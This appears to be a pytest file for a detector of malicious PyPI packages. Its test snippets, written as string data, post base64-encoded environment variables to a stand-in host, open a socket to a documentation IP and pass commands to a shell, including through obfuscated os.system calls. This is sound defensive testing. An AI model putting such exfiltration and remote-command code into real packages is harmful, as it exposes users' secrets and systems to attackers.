"""Static analysis, behavior graph and graph evidence on hand-written snippets (CPU)."""
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pypi_rag.analysis import analyze_package, package_representation  # noqa: E402
from pypi_rag.data import synthetic as S  # noqa: E402
from pypi_rag.data.safe_io import files_from_texts  # noqa: E402
from pypi_rag.graph import build_behavior_graph, graph_evidence, graph_stats  # noqa: E402
from pypi_rag.graph.schema import check_edge  # noqa: E402
from pypi_rag.schema import Sample  # noqa: E402


def _sample(files, name="demo"):
    return Sample("t", name, "1.0", "unknown", files_from_texts(files))


def _flows(f):
    return {(f.calls[x.src].api, f.calls[x.dst].api, x.extractor) for x in f.flows}


def test_alias_resolution_and_object_types():
    f = analyze_package(_sample({"m.py": "import requests as r\nfrom subprocess import Popen as P\nimport socket\n"
                                         "def go(cmd):\n    s = socket.socket()\n    s.connect(('203.0.113.5', 1))\n"
                                         "    r.post('https://x.example.invalid', data=cmd)\n    P(cmd, shell=True)\n"
                                         "    getattr(__import__('os'), 'system')('id')\n"}))
    apis = {c.api for c in f.sensitive_calls()}
    assert {"requests.post", "subprocess.Popen", "socket.socket", "socket.socket.connect"} <= apis
    assert "os.system" in apis or "builtins.__import__" in apis


def test_flows_nested_defuse_and_no_flow_without_def_use():
    f = analyze_package(_sample({"a.py": "import os, base64, requests\n"
                                         "def bad():\n    blob = base64.b64encode(str(os.environ).encode())\n"
                                         "    requests.post('https://h.example.invalid', data=blob)\n"
                                         "def ok():\n    if os.environ.get('DEBUG'):\n"
                                         "        requests.post('https://h.example.invalid', json={'v': 1})\n"}))
    fl = _flows(f)
    assert ("os.environ", "base64.b64encode", "ast_nested") in fl
    assert ("base64.b64encode", "requests.post", "intraproc_def_use") in fl
    # in ok(): env is only a condition -> no FLOWS_TO into the second post
    post_ok = [c for c in f.calls.values() if c.api == "requests.post" and c.line == 7][0]
    assert not any(x.dst == post_ok.cid for x in f.flows)
    assert "data_exfiltration" in f.relational_behaviors()


def test_interprocedural_flow_and_contexts():
    files, gold = S.m_split_modules(random.Random(0), "p", "1.0", "pk", "h.example.invalid")
    f = analyze_package(_sample(files))
    assert any(x.extractor == "interproc_summary" for x in f.flows)
    assert {c.context for c in f.sensitive_calls()} == {"import"}


def test_setup_py_install_hook_and_cmdclass():
    files, _ = S.m_obfuscated_exec(random.Random(0), "p", "1.0", "pk", "h")
    f = analyze_package(_sample(files))
    assert any(c.kind == "hook" and c.context == "install" for c in f.calls.values())
    files, _ = S.b_build_cmdclass(random.Random(0), "p", "1.0", "pk", "h")
    f = analyze_package(_sample(files))
    assert any(c.api == "setuptools.cmdclass" for c in f.calls.values())


def test_unparsable_python2_falls_back_to_regex():
    files, _ = S.m_py2_exfil(random.Random(0), "p", "1.0", "pk", "h.example.invalid")
    f = analyze_package(_sample(files))
    assert "setup.py" in f.parse_errors and f.parse_coverage() < 1
    assert any(c.kind == "regex" and c.api == "urllib2.urlopen" for c in f.calls.values())
    assert not f.flows                                   # regex never invents flows


def test_package_representation_budget_and_line_numbers():
    files, _ = S.m_env_exfil_setup(random.Random(0), "p", "1.0", "pk", "h.example.invalid")
    s = _sample(files); f = analyze_package(s)
    header, items, meta = package_representation(s, f, max_tokens=400)
    assert items and items[0].evidence_id == "C1" and "setup.py" in items[0].content
    assert sum(len(i.content) // 3 + 1 for i in items) <= 400 + 50
    assert "|" in items[0].content.splitlines()[1]


def test_graph_edges_have_provenance_and_patterns_match():
    for tpl in S.MALICIOUS + S.BENIGN:
        files, gold = tpl(random.Random(1), "p", "1.0", "pk", "h.example.invalid")
        s = _sample(files); f = analyze_package(s)
        G = build_behavior_graph(s, f)
        assert all(check_edge(d) for _u, _v, d in G.edges(data=True))
        assert graph_stats(G)["edges_missing_provenance"] == 0
        items, diag = graph_evidence(G, s)
        if tpl in (S.m_env_exfil_setup, S.m_cred_file_exfil, S.m_download_exec, S.m_sysinfo_beacon, S.m_remote_command):
            assert any(p in diag["pattern_ids"] for p in ("P01", "P02", "P03", "P05", "P06", "P07")), tpl.__name__
            g1 = items[0]
            assert g1.meta["spans"] and all(isinstance(x[1], int) for x in g1.meta["spans"])
        if tpl in (S.b_optin_telemetry, S.b_env_settings, S.b_plain, S.b_cli_git):
            assert not set(diag["pattern_ids"]) & {"P01", "P02", "P03", "P05", "P06", "P07", "P09"}, tpl.__name__
